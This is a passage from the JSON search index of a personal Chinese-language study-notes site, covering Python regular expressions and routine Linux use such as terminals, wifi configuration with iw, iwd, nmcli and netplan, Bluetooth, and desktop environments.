text)\n\nprint(result)\n</code></pre>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#lookahead-assertion","title":"lookahead assertion","text":"<pre><code>(?=...) #\u5339\u914d\u5219\u7ee7\u7eed\n(?!...) #\u4e0d\u5339\u914d\u5219\u7ee7\u7eed\n</code></pre> <p><code>(?=...)</code> Matches if\u00a0<code>...</code>\u00a0matches next, but doesn\u2019t consume any of the string. This is called a\u00a0lookahead assertion. For example,\u00a0<code>Isaac\u00a0(?=Asimov)</code>\u00a0will match\u00a0<code>'Isaac\u00a0'</code>\u00a0only if it\u2019s followed by\u00a0<code>'Asimov'</code>.</p> <p><code>(?!...)</code> Matches if\u00a0<code>...</code>\u00a0doesn\u2019t match next. This is a\u00a0negative lookahead assertion. For example,\u00a0<code>Isaac\u00a0(?!Asimov)</code>\u00a0will match\u00a0<code>'Isaac\u00a0'</code>\u00a0only if it\u2019s\u00a0not\u00a0followed by\u00a0<code>'Asimov'</code>.</p> <p>example</p> <pre><code>r'.*[.](?!bat$)[^.]*$' #\u5339\u914d\u6240\u6709\u975e*.bat \u6587\u4ef6\n</code></pre>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#verbose","title":"VERBOSE","text":"<pre><code>pat = re.compile(r\"\"\"\n \\s*                 # Skip leading whitespace\n (?P&lt;header&gt;[^:]+)   # Header name\n \\s* :               # Whitespace, and a colon\n (?P&lt;value&gt;.*?)      # The header's value -- *? used to\n                     # lose the following trailing whitespace\n \\s*$                # Trailing whitespace to end-of-line\n\"\"\", re.VERBOSE)\n</code></pre>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#greedy-vs-non-greedy-vs-possessive","title":"Greedy vs Non-Greedy vs Possessive","text":"<ul> <li>greedy: \u9ed8\u8ba4\u60c5\u51b5<code>*, +, ?</code>\u90fd\u4f1a\u5c3d\u53ef\u80fd\u5339\u914d\u591a\u7684\u5b57\u7b26</li> <li>non-greedy\uff1a\u4f7f\u7528<code>?</code>\u4fee\u9970\uff0c\u5373<code>*?</code>,\u00a0<code>+?</code>,\u00a0<code>??</code>\uff0c\u5339\u914d\u5c3d\u53ef\u80fd\u5c11\u7684\u5b57\u7b26</li> <li>possessive\uff1a\u5339\u914d\u5c3d\u53ef\u80fd\u591a\uff0c\u5e76\u4e14\u4e0d\u5efa\u7acb backtrace \u70b9\uff0c\u53ef\u80fd\u5bfc\u81f4\u5339\u914d\u5931\u8d25\u3002<ul> <li>\u6bd4\u5982<code>aaaa</code>\uff0c<code>a*a</code>\u4e2d\u7684<code>a*</code>\u5339\u914d\u5230\u7b2c 4 \u4e2a a \u540e\uff0c\u4f1a\u5bfc\u81f4 a \u5339\u914d\u5931\u8d25\uff0c\u56e0\u6b64\u4f1a\u56de\u6eaf\u3002\u6700\u7ec8<code>a*</code>\u5339\u914d 3 \u4e2a a\uff0c\u6700\u540e\u4e00\u4e2a a \u5355\u72ec\u5339\u914d\u3002</li> <li>\u4f46\u662f<code>a*+a</code>\u6ca1\u6709\u8fd9\u4e2a\u56de\u6eaf\u8fc7\u7a0b\uff0c\u5bfc\u81f4\u8868\u8fbe\u5f0f\u5339\u914d\u5931\u8d25</li> </ul> </li> </ul> <pre><code>&gt;&gt;&gt; s = '&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;'\n&gt;&gt;&gt; print(re.match('&lt;.*&gt;', s).group())\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;\n\n&gt;&gt;&gt; print(re.match('&lt;.*?&gt;', s).group())\n&lt;html&gt;\n</code></pre>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/","title":"linux \u76f8\u5173-linux \u4f7f\u7528","text":"<p>\u8bb0\u5f55\u4ece OS \u4f7f\u7528\u8005\u7684\u89d2\u5ea6\uff0c\u8bb0\u5f55 linux \u7684\u4e00\u4e9b\u7ecf\u9a8c</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#tty-pts","title":"tty, pts","text":"<ul> <li>tty \u8868\u793a\u7ec8\u7aef (terminal or console) \u7684\u7edf\u79f0\u3002tty(tele typerwriter) \u7535\u4f20\u6253\u5b57\u673a\u4e3a\u65e9\u671f\u7535\u8111\u7684\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\uff0c\u540e\u9762\u88ab\u663e\u793a\u5668\u548c\u952e\u76d8\u53d6\u4ee3\u3002<ul> <li>ctrl alt + F1-F6 \u5bf9\u5e94 6 \u4e2a\u7ec8\u7aef</li> <li>ctrl alt + F7 \u5bf9\u5e94\u56fe\u5f62\u5316\u754c\u9762</li> </ul> </li> <li>pts(pseudo terminal slave) \u8868\u793a\u4f2a\u7ec8\u7aef\u3002\u662f\u4e00\u4e2a\u7a0b\u5e8f\uff08\u7ec8\u7aef\u4eff\u771f\u5668 teminal emulators\uff09</li> </ul> <pre><code>who #\u67e5\u770b\u5f53\u524d\u6240\u6709\u767b\u5f55\u7528\u6237\u53ca\u7ec8\u7aef\n\u279c  ~ who\nyfy      :1           2022-10-24 14:26 (:1)\nyfy      pts/1        2022-10-16 15:36 (tmux(1158265).%0)\nyfy      pts/2        2022-10-24 14:43 (192.168.1.180)\nyfy      pts/3        2022-10-23 18:57 (tmux(1158265).%5)\nyfy      pts/4        2022-10-16 15:37 (tmux(1158265).%2)\nyfy      pts/6        2022-10-16 15:38 (tmux(1158265).%3)\nyfy      pts/7        2022-10-16 15:38 (tmux(1158265).%4)\nyfy      pts/12       2022-10-24 00:36 (tmux(1158265).%0)\nwho -m # \u67e5\u770b\u5f53\u524d\u7528\u6237\n\necho \"hello\" &gt; /dev/pty/x   #\u76f4\u63a5\u7ed9\u5bf9\u5e94\u7ec8\u7aef\u53d1\u9001\u6d88\u606f\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u751f\u6d3b\u76f8\u5173","title":"\u751f\u6d3b\u76f8\u5173","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u7981\u6b62\u4f11\u7720","title":"\u7981\u6b62\u4f11\u7720","text":"<p>How to Disable Suspend and Hibernation Modes In Linux (tecmint.com)</p> <pre><code>sudo systemctl status sleep.target suspend.target hibernate.target hybrid-sleep.target\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u7981\u6b62\u5173\u95ed\u7b14\u8bb0\u672c\u76d6\u5b50\u4f11\u7720","title":"\u7981\u6b62\u5173\u95ed\u7b14\u8bb0\u672c\u76d6\u5b50\u4f11\u7720","text":"<pre><code>vim /etc/systemd/logind.conf\n\nHandleLidSwitch=lock   # \u4ecesuspend\u6539\u4e3alock\n</code></pre> <p>man logind.conf</p> <p>Controls how logind shall handle the system power, reboot and sleep keys and the lid switch to trigger actions such as system power-off, reboot or suspend. Can be one of \"ignore\", \"poweroff\", \"reboot\", \"halt\", \"kexec\", \"suspend\", \"hibernate\", \"hybrid-sleep\", \"suspend-then-hibernate\", \"lock\", and \"factory-reset\".</p> <p>If \"ignore\", systemd-logind will never handle these keys. If \"lock\", all running sessions will be screen-locked; otherwise, the specified action will be taken in the respective event. Only input devices with the \"power-switch\" udev tag will be watched for key/lid switch events.</p> <p>HandlePowerKey= defaults to \"poweroff\", HandleRebootKey= defaults to \"reboot\", HandleSuspendKey= defaults to \"suspend\", HandleHibernateKey= defaults to \"hibernate\", HandlePowerKeyLongPress= defaults to \"ignore\", HandleRebootKeyLongPress= defaults to \"poweroff\", HandleSuspendKeyLongPress= defaults to \"hibernate\", HandleHibernateKeyLongPress= defaults to \"ignore\".  HandleLidSwitch= defaults to \"suspend\".  HandleLidSwitchExternalPower= is completely ignored by default (for backwards compatibility) \u2014 an explicit value must be set before it will be used to determine behaviour.  HandleLidSwitchDocked= defaults to \"ignore\". If the system is inserted in a docking station, or if more than one display is connected, the action specified by HandleLidSwitchDocked= occurs; if the system is on external power the action (if any) specified by HandleLidSwitchExternalPower= occurs; otherwise the HandleLidSwitch= action occurs. </p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u8fde\u63a5-wifi","title":"\u8fde\u63a5 wifi","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#iwiwconfig-\u7b49\u5e95\u5c42\u5de5\u5177","title":"iw,iwconfig \u7b49\u5e95\u5c42\u5de5\u5177","text":"<ul> <li>iw</li> <li>iwlist</li> <li>wpa_supplicant: \u7528\u4e8e\u8fde\u63a5 WPA \u52a0\u5bc6\u7684 wifi</li> </ul> <p>\u4e0d\u4f7f\u7528 networkmanger \u7b49\u5de5\u5177\uff0c\u9700\u8981</p> <ul> <li>iw \u8fde\u63a5 wifi<ul> <li>ifup interface</li> </ul> </li> <li>\u5f00\u542f dhcpclient \u83b7\u5f97 ip</li> </ul> <p>Network configuration/Wireless - ArchWiki (archlinux.org)</p> <pre><code>\u2588\u2593\u2592\u2591root@king3399\u2588\u2593\u2592\u2591 Mon Aug 07 03:07:46pm\n~/ iw dev wlan0 station dump\nStation 3c:cd:57:f5:da:85 (on wlan0)\n        inactive time:  0 ms\n        rx bytes:       26025\n        rx packets:     153\n        tx bytes:       22842\n        tx packets:     121\n        tx failed:      0\n        signal:         -63 dBm\n        tx bitrate:     234.0 MBit/s\n        rx bitrate:     390.0 MBit/s\n        authorized:     yes\n        authenticated:  yes\n        associated:     yes\n        WMM/WME:        yes\n        TDLS peer:      no\n        DTIM period:    1\n        beacon interval:100\n        short slot time:yes\n        connected time: 60 seconds\n        current time:   1691392108815 ms\n\u2588\u2593\u2592\u2591root@king3399\u2588\u2593\u2592\u2591 Mon Aug 07 03:08:28pm\n~/ iw dev wlan0 link\nConnected to 3c:cd:57:f5:da:85 (on wlan0)\n        SSID: ACSA-706-5G\n        freq: 5240\n        RX: 29153 bytes (171 packets)\n        TX: 24932 bytes (142 packets)\n        signal: -60 dBm\n        rx bitrate: 390.0 MBit/s\n        tx bitrate: 234.0 MBit/s\n\n        bss flags:      short-slot-time\n        dtim period:    1\n        beacon int:     100\n</code></pre> <p>\u626b\u63cf wifi</p> <pre><code>iwlist wlan0 scan |grep ESSID    # \u5217\u51fawifi\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#iwd","title":"iwd","text":"<p>pve \u8bbe\u7f6e wifi \u548c\u666e\u901a debian \u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u5e94\u8be5\u907f\u514d\u4f7f\u7528 networkmanager \u7b49\u9ad8\u7ea7\u7684\u7f51\u7edc\u670d\u52a1\u3002\u56e0\u4e3a\u8fd9\u4e9b\u662f\u4e3a\u684c\u9762\u73af\u5883\u8bbe\u8ba1\u7684\uff0c\u4e0d\u9002\u5408 pve\u3002WLAN - Proxmox VE</p> <p>Setting up the Wi-Fi itself is not different in Proxmox VE than with a default Debian installation. But\u00a0avoid\u00a0installing advanced, network daemons like NetworkManager as those are normally suited for desktops only and may interfere with Proxmox VEs network requirements.</p> <p>debian \u4f7f\u7528 wifi \u65b9\u6cd5\u603b\u7ed3\uff1aWiFi/HowToUse - Debian Wiki</p> <ul> <li>iwd \u4f5c\u4e3a NetworkManager, and systemd-networkd \u7b49\u7684 backend</li> <li>\u53ef\u4ee5\u81ea\u5df1\u4f7f\u7528 iwd + systemd-resolved \u6253\u9020\u4e00\u4e2a\u6700\u8f7b\u91cf\u7684\u7f51\u7edc\u6808</li> </ul> <p>iwd - ArchWiki (archlinux.org)</p> <p>\u5982\u679c\u60f3\u8981\u5355\u72ec\u4f7f\u7528 iwd\uff0c\u9700\u8981 <code>/etc/iwd/main.conf</code> \u5f00\u542f\u7f51\u7edc\u914d\u7f6e\uff08\u5426\u5219\u4e0d\u4f1a dhcp \u83b7\u5f97 v4 \u5730\u5740\uff09</p> <pre><code>[General]\nEnableNetworkConfiguration=true\n</code></pre> <pre><code>[IPv4]\nAddress=192.168.36.216\nNetmask=255.255.255.0\nGateway=192.168.36.1\nBroadcast=192.168.36.255\nDNS=192.168.36.1\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#networkmanger","title":"NetworkManger","text":"<p>GUI\uff1a\u57fa\u4e8e GTK \u7684nm-connection-editor CLI\uff1a</p> <ul> <li>nmtui\uff1a\u4f7f\u7528\u8d77\u6765\u5f88\u7b80\u5355\uff0c\u53ef\u4ee5\u7f16\u8f91\u6709\u7ebf\u65e0\u7ebf\u914d\u7f6e\uff0c\u6fc0\u6d3b\u8fde\u63a5\u7b49\u3002</li> <li>nmcli\uff1a\u66f4\u52a0\u5e95\u5c42\u7684\u547d\u4ee4\u884c\uff0c\u529f\u80fd\u8fd8\u662f\u5f88\u5f3a\u5927\u7684</li> </ul>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#nmtui","title":"nmtui","text":"<p>\u7b80\u5355\u7684\u8bdd\uff0c\u76f4\u63a5\u4f7f\u7528 nmtui\uff0c\u9009\u62e9 Wifi \u8f93\u5165\u5bc6\u7801\u5373\u53ef\u3002</p> <p></p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#nmcli-\u57fa\u672c\u4f7f\u7528","title":"nmcli \u57fa\u672c\u4f7f\u7528","text":"<pre><code>nmcli conn\nnmcli conn edit xxx\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#wpa2-enterprise-\u8fde\u63a5\u914d\u7f6eeduroam","title":"WPA2 Enterprise \u8fde\u63a5\u914d\u7f6e\uff08eduroam\uff09","text":"<p>WPA2 Enterprise \u5bfc\u81f4\u7684 wifi \u65e0\u6cd5\u8fde\u63a5\u95ee\u9898(7) Cannot Connect to College WIFI using NetworkManager : archlinux (reddit.com)</p> <pre><code>Failed to determine AP security information\n</code></pre> <p>12.10 - Connect to a WPA2-Enterprise Connection via CLI (no desktop) - Ask Ubuntu</p> <pre><code>nmcli con add type wifi ifname wlan0 con-name eduroam ssid eduroam \n\nYou may edit the following settings: connection, 802-11-wireless (wifi), 802-11-wireless-security (wifi-sec), 802-1x, ethtool, match, ipv4, ipv6, hostname, tc, proxy\nnmcli&gt; set 802-1x.eap peap\nnmcli&gt; set 802-1x.phase2-auth mschapv2\nnmcli&gt; set 802-1x.identity xxxxx\nnmcli&gt; set 802-1x.password xxxxx\nnmcli&gt; set wifi-sec.key-mgmt wpa-eap\nnmcli&gt; save\nConnection 'eduroam' (ae79dc6c-b660-469d-9ecb-3a29504de969) successfully updated.\nnmcli&gt; activate\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#netplan-\u8fde\u63a5-wifi-\u914d\u7f6e","title":"netplan \u8fde\u63a5 wifi \u914d\u7f6e","text":"<p>How to configure wifi in Ubuntu (linuxhint.com)</p> <pre><code># netplan yaml\nnetwork:\n  version: 2\n  renderer: networkd\n  wifis:\n      wlan0:\n        optional: true\n        dhcp4: true\n        dhcp6: true\n        access-points:\n          \"ustcnet\": {}   # \u6ca1\u6709\u5bc6\u7801\n          \"ssid2\":\n            password: \"aaa\"\n</code></pre> <p>\u901a\u8fc7 iwconfig \u67e5\u770b\u662f\u5426\u8fde\u63a5\u6210\u529f\uff0c\u51fa\u73b0 ESSID \u5219\u4e3a\u6210\u529f</p> <pre><code>\u279c  ~ iwconfig wlan0\nwlan0     IEEE 802.11  ESSID:\"P2W_5G\"\n          Mode:Managed  Frequency:5.745 GHz  Access Point: 1C:40:E8:11:89:CF\n          Bit Rate=234 Mb/s   Tx-Power=22 dBm\n          Retry short limit:7   RTS thr:off   Fragment thr:off\n          Power Management:on\n          Link Quality=70/70  Signal level=-35 dBm\n          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n          Tx excessive retries:0  Invalid misc:7   Missed beacon:0\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u97f3\u4e50","title":"\u97f3\u4e50","text":"<p>USB Bluetooth passthrough KVM : VFIO (reddit.com) The 5 Best Command Line Music Players for Linux (tecmint.com)</p> <pre><code>sudo apt install cmus\ncmus\n\n5 # \u6d4f\u89c8\u5f53\u524d\u6587\u4ef6\u5939\n</code></pre> <p>\u4f7f\u7528 vlc</p> <pre><code>cvlc file.mp3\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u84dd\u7259","title":"\u84dd\u7259","text":"<p>Bluetooth - ArchWiki (archlinux.org)</p> <p>\u547d\u4ee4\u884c\u5de5\u5177<code>bluetoothctl</code></p> <ol> <li>(optional) Select a default controller with\u00a0<code>select\u00a0_MAC_address_</code>.</li> <li>(optional) Enter\u00a0<code>power on</code>\u00a0to turn the power to the controller on if the device is set to off. It is on by default; see\u00a0#Default adapter power state.</li> <li>Enter\u00a0<code>devices</code>\u00a0to get the MAC address of the device with which to pair.</li> <li>Enter device discovery mode with\u00a0<code>scan on</code>\u00a0command if device is not yet on the list.</li> <li>Turn the agent on with\u00a0<code>agent on</code>\u00a0or choose a specific agent: if you press tab twice after\u00a0<code>agent</code>\u00a0you should see a list of available agents. A bluetooth agent is what manages the Bluetooth 'pairing code'. It can either respond to a 'pairing code' coming in, or can send one out. The\u00a0<code>default-agent</code>\u00a0should be appropriate in most cases.[1]</li> <li>Enter\u00a0<code>pair\u00a0_MAC_address_</code>\u00a0to do the pairing (tab completion works).</li> <li>If using a device without a PIN, one may need to manually trust the device before it can reconnect successfully. Enter\u00a0<code>trust\u00a0_MAC_address_</code>\u00a0to do so.</li> <li>Enter\u00a0<code>connect\u00a0_MAC_address_</code>\u00a0to establish a connection.</li> </ol>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u684c\u9762\u73af\u5883","title":"\u684c\u9762\u73af\u5883","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u57fa\u672c\u6982\u5ff5","title":"\u57fa\u672c\u6982\u5ff5","text":"<p>\u4ec0\u4e48\u662f Desktop Environment\uff1f</p> <p>A desktop environment bundles together a variety of components to provide common graphical user interface elements such as icons, toolbars, wallpapers, and desktop widgets.</p> <ul> <li>\u901a\u5e38\u4e5f\u81ea\u5e26\u4e86 window manager \u548c Display manager</li> </ul> <p>window manager  - DE \u901a\u5e38\u81ea\u5e26\u4e00\u4e2a window manager\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u66ff\u6362\u6210\u517c\u5bb9\u7684\u5176\u5b83 window manager - Window managers are X clients that control the appearance and behaviour of the frames (\"windows\") where the various graphical applications are drawn. - Window manager \u65f6 Xorg \u7684\u6982\u5ff5\uff0cWayland \u4e0b\u5bf9\u5e94\u7684\u7ec4\u4ef6\u662f Compositor\u3002Window managers are unique to Xorg. The equivalent of window managers on Wayland are called\u00a0compositors\u00a0because they also act as\u00a0compositing window managers. - \u7c7b\u578b   - stacking   - tiling     - i3</p> <p>Display manager - ArchWiki (archlinux.org) - A\u00a0display manager, or login manager, is typically a graphical user interface that is displayed at the end of the boot process in place of the default shell. - GDM\u00a0\u2014\u00a0GNOME\u00a0display manager. - LightDM\u00a0\u2014 Cross-desktop display manager, can use various front-ends written in any toolkit.</p> <p>gnome-shell\uff1ashell \u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u56fe\u5f62\u754c\u9762</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#display-manager","title":"display manager","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#lightdm","title":"lightdm","text":"<p>\u6548\u679c\u8fd8\u662f\u4e0d\u9519\u7684\uff0c\u5e76\u4e14\u542f\u52a8 xfce4 \u548c gnome \u90fd\u6ca1\u6709\u9047\u5230\u95ee\u9898\u3002 </p> <p>\u5b89\u88c5\u65f6\u4f1a\u63d0\u793a\u548c gdm \u51b2\u7a81 <pre><code>apt install lightdm\n</code></pre></p> <p></p> <p>\u597d\u50cf\u9700\u8981\u8fdb\u5165 graphical.target \u624d\u80fd\u6b63\u5e38\u4f7f\u7528\u3002gdm \u53ef\u4ee5\u5728 multi-user.target \u4e0b \u901a\u8fc7  sudo systemctl start gdm \u542f\u52a8\u56fe\u5f62\u754c\u9762\u3002lightdm systemctl start \u62a5\u9519</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#gdm3","title":"gdm3","text":"<p>\u9009\u4e2d\u7528\u6237\uff0c\u8f93\u5165\u5bc6\u7801\u65f6\u53f3\u4e0b\u811a\u624d\u4f1a\u51fa\u73b0\u9f7f\u8f6e\u6765\u5207\u6362\u684c\u9762\u73af\u5883\u3002</p> <p>\u5207\u6362 wayland \u548c xorgHow to Enable or Disable Wayland on Ubuntu 22.04 Desktop \u2013 TecAdmin</p> <pre><code>vim /etc/gdm3/custom.conf\n\n[daemon]\n# Uncomment the line below to force the login screen to use Xorg\n#WaylandEnable=false\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u914d\u7f6e\u662f\u5426\u81ea\u52a8\u767b\u9646</p> <pre><code>[daemon]\nAutomaticLoginEnable=True\nAutomaticLogin=yfy\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#gnome","title":"gnome","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#xfce","title":"xfce","text":"<p>\u53c2\u8003\u8d44\u6599</p> <ul> <li>xfce:getting-started [Xfce Docs]</li> <li>\u8bbe\u7f6e display manager\uff1axfce:display_managers [Xfce Docs]<ul> <li>ubuntu 22.04 \u4f4d\u4e8e <code>/usr/share/xsessions/xfce.desktop</code></li> </ul> </li> </ul>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>debian - ubuntu \u8c8c\u4f3c\u76f4\u63a5\u5b89\u88c5 xubuntu-desktop \u5373\u53ef\uff0c\u4f46\u662f\u6211\u8bd5\u4e86 debian \u5b89\u88c5\u65b9\u5f0f\u4e5f\u6ca1\u95ee\u9898 <pre><code>apt install xfce4 xfce4-goodies\n</code></pre></p> <p>xfce4: This package is a metapackage; it depends on the core packages of the Xfce4 desktop environment and recommends some extra Xfce4 packages.  If you intend to use Xfce4 and want the full experience then installing this package and the packages it Recommends is a great place to start.</p> <p>xfce4-goodies\u00a0is a metapackage that will install many useful plugins and applications related to Xfce. It's a suggested package for standard users that want a complete Xfce desktop experience, however you may have a more \"minimal\" installation by only installing the specific packages that you want from the list below.</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#kde","title":"KDE","text":"<p>\u53c2\u8003\u8d44\u6599</p> <ul> <li>ubuntu \u5b89\u88c5 KDE\uff1aHow to Install KDE on Ubuntu [Beginner's Guide] (itsfoss.com)</li> </ul> <p>KDE \u548c KDE Plasma</p> <p>Since they were not essentially a desktop environment anymore, a few years ago, they segregated the desktop environment. Plasma is the desktop environment and KDE is the umbrella project responsible for the development of Plasma desktop and a bunch of other applications.</p> <ul> <li>kde-full: 1 GB</li> <li>kde-standard: 273 MB</li> <li>kde-plasma-desktop: 175 MB</li> </ul> <pre><code>sudo apt install kde-standard\n</code></pre> <p>SDDM: KDE \u81ea\u5e26\u7684 diskplay manager</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u7cfb\u7edf","title":"\u7cfb\u7edf","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u6253\u4e0d\u5f00-setting","title":"\u6253\u4e0d\u5f00 setting","text":"<p>Settings window does not open in Ubuntu 22.04 - Ask Ubuntu <pre><code>sudo apt-get install --reinstall gnome-control-center\n</code></pre></p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u65e0\u6cd5-x11-forwarding","title":"\u65e0\u6cd5 X11 forwarding","text":"<p>\u60f3\u8981\u6d4b\u8bd5 x11 \u9700\u8981\u914d\u7f6e XServer\uff0c\u5728 git bash \u7b49\u7ec8\u7aef\u662f\u4e0d\u884c\u7684\uff0c\u9700\u8981\u4f7f\u7528 mobaxterm</p> <pre><code>debug1: Remote: /staff/fyyuan/.ssh/authorized_keys:3: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding\ndebug1: Remote: /staff/fyyuan/.ssh/authorized_keys:3: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding\ndebug1: Requesting X11 forwarding with authentication spoofing.\ndebug1: Remote: No xauth program; cannot forward X11.\nX11 forwarding request failed on channel 0\n</code></pre> <p>ssh - No xauth program; cannot forward X11 - Unix &amp; Linux Stack Exchange</p> <p>\u89e3\u51b3 <pre><code>apt install 